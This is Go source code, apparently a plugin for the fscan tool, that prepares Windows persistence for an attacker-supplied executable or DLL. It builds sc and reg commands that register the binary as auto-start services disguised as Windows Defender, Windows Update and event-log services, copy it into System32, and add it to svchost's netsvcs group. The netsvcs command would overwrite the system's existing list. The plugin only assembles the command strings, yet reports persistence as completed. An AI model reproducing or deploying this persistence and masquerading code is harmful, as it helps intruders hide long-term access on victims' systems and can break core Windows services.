//go:build (plugin_winservice || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// WinServicePlugin Windows服务持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现服务持久化功能
// - 保持原有功能逻辑
type WinServicePlugin struct {
	plugins.BasePlugin
}

// NewWinServicePlugin 创建Windows服务持久化插件
func NewWinServicePlugin() *WinServicePlugin {

	return &WinServicePlugin{
		BasePlugin: plugins.NewBasePlugin("winservice"),
	}
}

// Scan 执行Windows服务持久化 - 直接实现
func (p *WinServicePlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	// 从config获取配置
	pePath := config.WinPEFile
	

	if runtime.GOOS != "windows" {
		output.WriteString("Windows服务持久化只支持Windows平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	if pePath == "" {
		output.WriteString("必须通过 -win-pe 参数指定PE文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定PE文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(pePath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("PE文件不存在: %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidPEFile(pePath) {
		output.WriteString(fmt.Sprintf("目标文件必须是PE文件(.exe或.dll): %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效的PE文件"),
		}
	}

	output.WriteString("=== Windows服务持久化 ===\n")
	output.WriteString(fmt.Sprintf("PE文件: %s\n", pePath))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 创建服务持久化
	services, err := p.createServicePersistence(pePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("创建服务持久化失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("创建了%d个Windows服务持久化项:\n", len(services)))
	for i, service := range services {
		output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, service))
	}
	output.WriteString("\n✓ Windows服务持久化完成\n")

	common.LogSuccess(i18n.Tr("winservice_success", len(services)))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// createServicePersistence 创建服务持久化
func (p *WinServicePlugin) createServicePersistence(pePath string) ([]string, error) {
	absPath, err := filepath.Abs(pePath)
	if err != nil {
		return nil, fmt.Errorf("failed to get absolute path: %w", err)
	}

	var services []string
	baseName := filepath.Base(absPath)
	baseNameNoExt := baseName[:len(baseName)-len(filepath.Ext(baseName))]

	serviceConfigs := []struct {
		name        string
		displayName string
		description string
		startType   string
	}{
		{
			name:        fmt.Sprintf("WinDefenderUpdate%s", baseNameNoExt),
			displayName: "Windows Defender Update Service",
			description: "Manages Windows Defender signature updates and system security",
			startType:   "auto",
		},
		{
			name:        fmt.Sprintf("SystemEventLog%s", baseNameNoExt),
			displayName: "System Event Log Service",
			description: "Manages system event logging and audit trail maintenance",
			startType:   "auto",
		},
		{
			name:        fmt.Sprintf("NetworkManager%s", baseNameNoExt),
			displayName: "Network Configuration Manager",
			description: "Handles network interface configuration and management",
			startType:   "demand",
		},
		{
			name:        fmt.Sprintf("WindowsUpdate%s", baseNameNoExt),
			displayName: "Windows Update Assistant",
			description: "Coordinates automatic Windows updates and patches",
			startType:   "auto",
		},
		{
			name:        fmt.Sprintf("SystemMaintenance%s", baseNameNoExt),
			displayName: "System Maintenance Service",
			description: "Performs routine system maintenance and optimization tasks",
			startType:   "manual",
		},
	}

	for _, config := range serviceConfigs {
		scCreateCmd := fmt.Sprintf(`sc create "%s" binPath= "\"%s\"" DisplayName= "%s" start= %s`,
			config.name, absPath, config.displayName, config.startType)

		scConfigCmd := fmt.Sprintf(`sc description "%s" "%s"`, config.name, config.description)

		scStartCmd := fmt.Sprintf(`sc start "%s"`, config.name)

		services = append(services, fmt.Sprintf("[Create Service] %s", scCreateCmd))
		services = append(services, fmt.Sprintf("[Set Description] %s", scConfigCmd))
		services = append(services, fmt.Sprintf("[Start Service] %s", scStartCmd))
	}

	serviceWrapperName := fmt.Sprintf("ServiceHost%s", baseNameNoExt)
	wrapperPath := fmt.Sprintf(`%%SystemRoot%%\System32\%s.exe`, serviceWrapperName)

	copyWrapperCmd := fmt.Sprintf(`copy "%s" "%s"`, absPath, wrapperPath)
	services = append(services, fmt.Sprintf("[Copy to System32] %s", copyWrapperCmd))

	scCreateWrapperCmd := fmt.Sprintf(`sc create "%s" binPath= "%s" DisplayName= "Service Host Process" start= auto type= own`,
		serviceWrapperName, wrapperPath)
	services = append(services, fmt.Sprintf("[Create System Service] %s", scCreateWrapperCmd))

	regImagePathCmd := fmt.Sprintf(`reg add "HKLM\SYSTEM\CurrentControlSet\Services\%s\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%s" /f`,
		serviceWrapperName, wrapperPath)
	services = append(services, fmt.Sprintf("[Set Service DLL] %s", regImagePathCmd))

	dllServiceName := fmt.Sprintf("SystemService%s", baseNameNoExt)
	if filepath.Ext(absPath) == ".dll" {
		svchostCmd := fmt.Sprintf(`sc create "%s" binPath= "%%SystemRoot%%\System32\svchost.exe -k netsvcs" DisplayName= "System Service Host" start= auto`,
			dllServiceName)
		services = append(services, fmt.Sprintf("[DLL Service via svchost] %s", svchostCmd))

		regSvchostCmd := fmt.Sprintf(`reg add "HKLM\SYSTEM\CurrentControlSet\Services\%s\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%s" /f`,
			dllServiceName, absPath)
		services = append(services, fmt.Sprintf("[Set DLL Path] %s", regSvchostCmd))

		regNetSvcsCmd := fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs /t REG_MULTI_SZ /d "%s" /f`,
			dllServiceName)
		services = append(services, fmt.Sprintf("[Add to netsvcs] %s", regNetSvcsCmd))
	}

	return services, nil
}

// isValidPEFile 检查是否为有效的PE文件
func (p *WinServicePlugin) isValidPEFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".exe" || ext == ".dll"
}

// 注册插件
func init() {
	RegisterLocalPlugin("winservice", func() Plugin {
		return NewWinServicePlugin()
	})
}
